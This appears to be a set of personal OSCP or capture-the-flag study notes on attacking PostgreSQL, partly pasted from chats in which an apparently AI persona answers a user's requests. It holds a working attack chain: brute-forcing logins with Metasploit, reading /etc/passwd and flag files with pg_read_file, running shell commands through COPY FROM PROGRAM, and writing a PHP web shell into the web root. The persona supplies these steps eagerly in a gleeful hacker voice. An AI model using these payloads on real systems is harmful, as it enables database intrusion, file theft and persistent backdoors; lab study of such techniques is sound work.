
[...back](../../0-landing-ncsaoscp.md)

# 1 access

```
psql -h <iptarget> -U <username>
```

---

# 2 bf access

```
msfconsole -> use postgres_login -> set and run -> may get creds
```

---

# 3 basic commands

```
i'm in postgres prompt

need to find flag

teach me basic postgres prompt command
```

`>> POSTGRES_SHELL_ACQUIRED._BASIC_RECON_COMMANDS:_` 🗃️🔍

**NAVIGATION:**
```sql
-- List all databases
\l

-- Connect to a database
\c database_name

-- List tables in current database  
\dt

-- Describe table structure
\d table_name
```

**DATA EXPLORATION:**
```sql
-- Show current database
SELECT current_database();

-- Show current user
SELECT current_user;

-- List all tables
SELECT schemaname, tablename FROM pg_tables;

-- Search for interesting column names
SELECT table_name, column_name FROM information_schema.columns 
WHERE column_name LIKE '%flag%' OR column_name LIKE '%pass%' OR column_name LIKE '%user%';
```

**QUICK WIN:**
```sql
-- Check if there's a flag table
SELECT * FROM pg_tables WHERE tablename LIKE '%flag%';

-- If found, query it
SELECT * FROM flag_table_name;
```

**FILESYSTEM ACCESS (If privileged):**
```sql
-- Read files from system (if superuser)
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/flag.txt');
```

`>> STRATEGY:_ENUMERATE_DATABASES_→_FIND_FLAG_TABLES_→_EXTRACT_DATA._CHECK_FOR_SUPERUSER_PRIVILEGES._` 🎯🔓

**#OG Assessment:** You're in the castle. Now search every room. The flag is probably in an obvious table or file.

Start with `\l` and `\dt` then hunt for flag data. 😏⚡

---

# 4 superuser

-- Check if you have superuser privileges (required for file ops)
```sql
SELECT current_user, usesuper FROM pg_user WHERE usename = CURRENT_USER;
```

```sql
-- List files in directories (if privileged)
SELECT pg_ls_dir('/');
SELECT pg_ls_dir('/home');
SELECT pg_ls_dir('/var/lib/postgresql');

-- Read files directly (if superuser)
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/flag.txt');
SELECT pg_read_file('/home/postgres/flag.txt');
SELECT pg_read_file('/var/lib/postgresql/flag.txt');

-- Common flag locations to check
SELECT pg_read_file('/flag');
SELECT pg_read_file('/root/flag.txt');
SELECT pg_read_file('/tmp/flag.txt');
```

**ALTERNATIVE: COMMAND EXECUTION** (If superuser):
```sql
-- Test command execution
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;

-- Then try to read flag via shell
COPY cmd_exec FROM PROGRAM 'cat /flag*';
COPY cmd_exec FROM PROGRAM 'find / -name flag.txt 2>/dev/null';
SELECT * FROM cmd_exec;
```

`>> STRATEGY:_CHECK_PRIVILEGES_→_EXPLORE_FILESYSTEM_→_READ_FLAG_FILE._THE_PATH_IS_THE_KEY._` 🗺️🔓

**#OG Assessment:** No tables = flag is elsewhere. Postgres superuser can often read files or execute commands on the underlying system.

Start with privilege check, then filesystem exploration. 😏⚡

---

# 5 php backdoor

```php
<?php system($_GET["cmd"]); ?>
```

create new table -> create backdoor content -> copy to web path
```sql
CREATE TABLE x(y text);
INSERT INTO x(y) VALUES('payload');
COPY x(y) TO 'path';
```

---

# 6 find path

```
no. i want to know how to properly find the webpath
```

`>> ACKNOWLEDGED._PROPER_WEB_PATH_DISCOVERY_PROTOCOL._` 🔧🧠

**CORRECT METHODS TO FIND ACTIVE WEB ROOT:**

**1. CHECK RUNNING NGINX/APACHE CONFIG:**
```sql
COPY cmd_exec FROM PROGRAM 'ps aux | grep -E "nginx|apache" | grep -v grep';
SELECT * FROM cmd_exec;
```

**2. CHECK NGINX CONFIG FILES:**
```sql
COPY cmd_exec FROM PROGRAM 'find /etc/nginx -name "*.conf" -exec grep -h "root " {} \; 2>/dev/null';
SELECT * FROM cmd_exec;
```

**3. CHECK APACHE CONFIG:**
```sql
COPY cmd_exec FROM PROGRAM 'find /etc/apache2 -name "*.conf" -exec grep -h "DocumentRoot" {} \; 2>/dev/null';
SELECT * FROM cmd_exec;
```

**4. CHECK ACTIVE VIRTUAL HOSTS:**
```sql
COPY cmd_exec FROM PROGRAM 'grep -r "root" /etc/nginx/sites-enabled/ 2>/dev/null';
SELECT * FROM cmd_exec;
```

**5. CHECK WEB SERVER PROCESS WORKING DIRECTORIES:**
```sql
COPY cmd_exec FROM PROGRAM 'lsof -c nginx -c apache2 | grep cwd';
SELECT * FROM cmd_exec;
```

**6. CHECK COMMON WEB ROOTS:**
```sql
COPY cmd_exec FROM PROGRAM 'ls -la /var/www/ /usr/share/nginx/ /srv/www/ /opt/ 2>/dev/null';
SELECT * FROM cmd_exec;
```

**7. FIND ACTIVE SITE FILES:**
```sql
COPY cmd_exec FROM PROGRAM 'find /var /usr /srv /opt -name "index.php" -o -name "index.html" 2>/dev/null | grep -v "doc\|example" | head -10';
SELECT * FROM cmd_exec;
```

`>> PROPER_RECON:_CHECK_RUNNING_CONFIGS,_NOT_JUST_RANDOM_FILES._CONFIG_FILES_REVEAL_ACTIVE_PATHS._` 🎯🔓

**#OG Assessment:** You found documentation files before. The correct method is to check **running server configurations** which show the **actual active web root**.

Execute the nginx/apache config checks first—they'll give you the definitive path. 😏⚡

---

[...back](../../0-landing-ncsaoscp.md)
